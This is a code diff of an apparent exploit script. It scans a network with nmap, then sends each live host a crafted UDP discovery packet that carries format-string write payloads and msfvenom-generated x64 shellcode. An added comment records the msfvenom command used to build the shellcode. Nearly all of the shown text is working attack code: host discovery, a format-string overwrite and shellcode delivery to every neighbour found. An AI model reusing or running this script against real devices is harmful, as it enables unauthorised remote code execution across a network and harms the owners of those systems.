@@ -22,7 +22,6 @@ def net_scan(network):
         print('Scanning Network')
         # Run nmap and pipe its output to awk
         command = f'nmap -oG - {network} | awk \'/Up$/{{print $2}}\''
-        # output = subprocess.check_output(command, shell=True, text=True)
         output = subprocess.check_output(command, shell=True, universal_newlines=True)
 
         # Split the output by newlines to get a list of IPs
@@ -68,6 +67,7 @@ def gen_discover_packet(ad_id, os, hn, user, inf, func):
     d += bytes([0x2, 0xc3, 0x51])
     return d
 
+#msfvenom -p linux/x64/exec CMD="touch ./youarefucked.txt" -b "\x00\x25\x26" -f python -v shellcode 
 shellcode =  b""
 shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf8\xff\xff\xff\x48"
 shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\x61\x62\x1e"
@@ -95,7 +95,7 @@ def run():
     
     for ip in neighbors:
         print(f'IP: {ip}')
-        p = gen_discover_packet(4919, 1, b'\x85\xfe%1$*1$x%18x%165$ln' + shellcode, b'\x85\xfe%18472249x%93$ln', 'ad', 'main')
+        p = gen_discover_packet(4919, 1, b'\x85\xfe%1$*1$x%18x%165$ln'+shellcode, b'\x85\xfe%18472249x%93$ln', 'ad', 'main')
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.sendto(p, (ip, port))
         s.close()
